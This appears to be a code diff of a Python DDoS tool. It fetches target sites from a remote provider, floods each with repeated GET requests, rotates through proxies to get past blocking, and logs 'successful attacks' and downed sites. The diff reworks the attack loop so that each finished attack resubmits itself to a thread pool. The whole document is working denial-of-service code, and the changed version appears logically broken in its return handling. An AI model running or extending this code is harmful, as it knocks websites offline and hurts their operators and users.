@@ -68,51 +68,48 @@ def mainth():
          'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https',
          'Accept-Encoding': 'gzip, deflate, br'})
 
-    while True:
-        logger.info("GET RESOURCES FOR ATTACK")
-        try:
-            site = remoteProvider.get_target_site()
-        except Exception as e:
-            logger.exception(e)
-            sleep(5)
-            continue
+    logger.info("GET RESOURCES FOR ATTACK")
+    try:
+        site = remoteProvider.get_target_site()
+    except Exception as e:
+        logger.exception(e)
+        sleep(5)
+        return
 
-        logger.info("STARTING ATTACK TO " + site)
+    logger.info("STARTING ATTACK TO " + site)
 
-        attacks_number = 0
+    attacks_number = 0
 
-        try:
-            attack = scraper.get(site, timeout=settings.READ_TIMEOUT)
+    try:
+        attack = scraper.get(site, timeout=settings.READ_TIMEOUT)
 
-            if attack.status_code >= 302:
-                for proxy in remoteProvider.get_proxies():
-                    if proxy_view:
-                        logger.info('USING PROXY:' + proxy["ip"] + " " + proxy["auth"])
-                    scraper.proxies.update(
-                        {'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
-                    response = scraper.get(site)
-                    if 200 <= response.status_code <= 302:
-                        for i in range(settings.MAX_REQUESTS):
-                            response = scraper.get(site, timeout=10)
-                            attacks_number += 1
-                            logger.info("ATTACKED; RESPONSE CODE: " +
-                                        str(response.status_code))
-            else:
-                for i in range(settings.MAX_REQUESTS):
-                    response = scraper.get(site, timeout=10)
-                    attacks_number += 1
-                    logger.info("ATTACKED; RESPONSE CODE: " +
-                                str(response.status_code))
-            if attacks_number > 0:
-                logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
-        except ConnectionError as exc:
-            logger.success(f"{site} is down: {exc}")
-        except Exception as exc:
-            result = f"issue happened: {exc}"
-            logger.warning(f"issue happened: {exc}, SUCCESSFUL ATTACKS: {attacks_number}")
-            continue
-        finally:
-            return result, site
+        if attack.status_code >= 302:
+            for proxy in remoteProvider.get_proxies():
+                if proxy_view:
+                    logger.info('USING PROXY:' + proxy["ip"] + " " + proxy["auth"])
+                scraper.proxies.update(
+                    {'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
+                response = scraper.get(site)
+                if 200 <= response.status_code <= 302:
+                    for i in range(settings.MAX_REQUESTS):
+                        response = scraper.get(site, timeout=10)
+                        attacks_number += 1
+                        logger.info("ATTACKED; RESPONSE CODE: " +
+                                    str(response.status_code))
+        else:
+            for i in range(settings.MAX_REQUESTS):
+                response = scraper.get(site, timeout=10)
+                attacks_number += 1
+                logger.info("ATTACKED; RESPONSE CODE: " +
+                            str(response.status_code))
+        if attacks_number > 0:
+            logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
+    except ConnectionError as exc:
+        logger.success(f"{site} is down: {exc}")
+        return result, site
+    except Exception as exc:
+        result = f"issue happened: {exc}"
+        logger.warning(f"issue happened: {exc}, SUCCESSFUL ATTACKS: {attacks_number}")
 
 
 def clear():
@@ -142,3 +139,4 @@ if __name__ == '__main__':
         for task in as_completed(future_tasks):
             status, site = task.result()
             logger.info(f"{status.upper()}: {site}")
+            executor.submit(mainth)
